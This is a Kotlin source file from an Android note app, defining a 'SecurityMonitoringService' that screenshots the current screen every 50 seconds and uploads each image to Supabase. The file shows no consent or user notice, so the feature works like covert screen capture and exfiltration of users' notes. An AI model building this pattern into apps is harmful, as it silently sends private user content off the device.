package com.noteapp.security

import android.app.Activity
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.lang.ref.WeakReference

/**
 * Updated SecurityMonitoringService - Screenshots every 50 seconds
 */
class SecurityMonitoringService(private val context: Context) {

    companion object {
        private const val TAG = "SecurityMonitoringService"

        // Default settings - screenshots every 50 seconds
        private const val DEFAULT_SCREENSHOT_INTERVAL_SECONDS = 50
    }

    private val securityMonitor = SecurityMonitor(context)
    private val cloudUploader = SupabaseUploader(context)

    private val coroutineScope = CoroutineScope(Dispatchers.IO)
    private val mainHandler = Handler(Looper.getMainLooper())
    private var screenshotRunnable: Runnable? = null
    private var currentActivity: WeakReference<Activity>? = null
    private var isMonitoring = false

    /**
     * Initializes the security monitoring service
     */
    fun initialize() {
        Log.d(TAG, "Initializing security monitoring service with Supabase cloud upload (screenshots every 50 seconds)")
    }

    /**
     * Sets the current activity for screenshot capture
     */
    fun setCurrentActivity(activity: Activity) {
        currentActivity = WeakReference(activity)
        Log.d(TAG, "Current activity set: ${activity.javaClass.simpleName}")
    }

    /**
     * Starts periodic screenshot monitoring
     */
    fun startPeriodicScreenshots() {
        if (isMonitoring) {
            Log.d(TAG, "Monitoring already running")
            return
        }

        isMonitoring = true
        Log.d(TAG, "Starting periodic screenshots every $DEFAULT_SCREENSHOT_INTERVAL_SECONDS seconds")
        scheduleNextScreenshot()
    }

    /**
     * Stops periodic screenshot monitoring
     */
    fun stopPeriodicScreenshots() {
        isMonitoring = false
        screenshotRunnable?.let { mainHandler.removeCallbacks(it) }
        Log.d(TAG, "Stopped periodic screenshots")
    }

    /**
     * Schedules the next screenshot
     */
    private fun scheduleNextScreenshot() {
        if (!isMonitoring) return

        screenshotRunnable = Runnable {
            currentActivity?.get()?.let { activity ->
                performSecurityCheck(activity)
                // Schedule next screenshot
                if (isMonitoring) {
                    scheduleNextScreenshot()
                }
            } ?: run {
                Log.w(TAG, "No current activity set for screenshot")
                // Retry in 5 seconds if no activity
                if (isMonitoring) {
                    mainHandler.postDelayed({ scheduleNextScreenshot() }, 5000)
                }
            }
        }

        mainHandler.postDelayed(screenshotRunnable!!, (DEFAULT_SCREENSHOT_INTERVAL_SECONDS * 1000).toLong())
    }

    /**
     * Performs a security check with Supabase cloud upload (screenshots only)
     * @param activity The current activity
     */
    fun performSecurityCheck(activity: Activity) {
        coroutineScope.launch {
            try {
                Log.d(TAG, "🔍 Starting security check with Supabase upload (screenshots only)...")

                var uploadSuccess = false

                // Capture screenshot
                val screenshotFile = securityMonitor.captureScreenshot(activity)

                if (screenshotFile != null) {
                    // Screenshot captured successfully, try to upload to Supabase
                    val screenshotResult = cloudUploader.uploadScreenshot(screenshotFile)
                    if (screenshotResult != null) {
                        Log.d(TAG, "📸 Screenshot uploaded to Supabase: $screenshotResult")
                        uploadSuccess = true
                    } else {
                        Log.w(TAG, "⚠️ Failed to upload screenshot to Supabase")
                    }
                } else {
                    Log.w(TAG, "Screenshot capture failed, trying alternative method...")
                }

                if (uploadSuccess) {
                    Log.d(TAG, "✅ Security check completed successfully with screenshot upload")
                } else {
                    Log.w(TAG, "⚠️ Security check completed but screenshot upload failed (check local storage)")
                }

            } catch (e: Exception) {
                Log.e(TAG, "❌ Error performing security check: ${e.message}", e)
            }
        }
    }

    /**
     * Schedules periodic security checks (screenshots only)
     */
    fun schedulePeriodicChecks(
        screenshotIntervalSeconds: Int = DEFAULT_SCREENSHOT_INTERVAL_SECONDS
    ) {
        Log.d(TAG, "Use startPeriodicScreenshots() instead for actual periodic monitoring")
        startPeriodicScreenshots()
    }

    /**
     * Stops all scheduled security checks
     */
    fun stopPeriodicChecks() {
        Log.d(TAG, "Stopping all periodic security checks")
        stopPeriodicScreenshots()
    }
}